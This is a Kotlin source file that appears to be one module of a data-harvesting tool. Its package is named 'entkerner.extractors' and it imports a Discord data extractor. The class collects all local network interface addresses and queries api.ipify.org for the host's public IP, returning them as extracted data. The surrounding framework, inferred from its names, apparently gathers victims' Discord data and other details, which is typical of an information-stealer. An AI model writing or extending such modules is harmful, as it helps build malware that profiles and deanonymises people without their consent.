package net.kerner.entkerner.extractors.standart

import io.ktor.client.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.http.*
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.extractors.discord.DiscordData
import net.kerner.entkerner.io.nullPaths
import java.io.File
import java.net.InetAddress
import java.net.NetworkInterface

class IPAddressExtractionWorker(
    val httpClient: HttpClient
) : AbstractDataExtractor<List<String>>(httpClient) {
    override val fileDirectories = nullPaths
    override val name = "InternetProtocolAddressExtractor"

    /**
     * This works by requesting a service e.g. Amazon due to DHCP + NAT in the Router Configuration -> will return the
     * public IP
     */
    override suspend fun extractData(file: File): List<String> {
        val addresses = mutableListOf<String>()
        NetworkInterface.getNetworkInterfaces().asIterator().forEach { networkInterface ->
            networkInterface.inetAddresses.asIterator().forEach { internetAddress ->
                addresses.add(internetAddress.hostAddress)
            }
        }
        addresses.add(String(httpClient.get("https://api.ipify.org/").readBytes()))
        return addresses
    }
}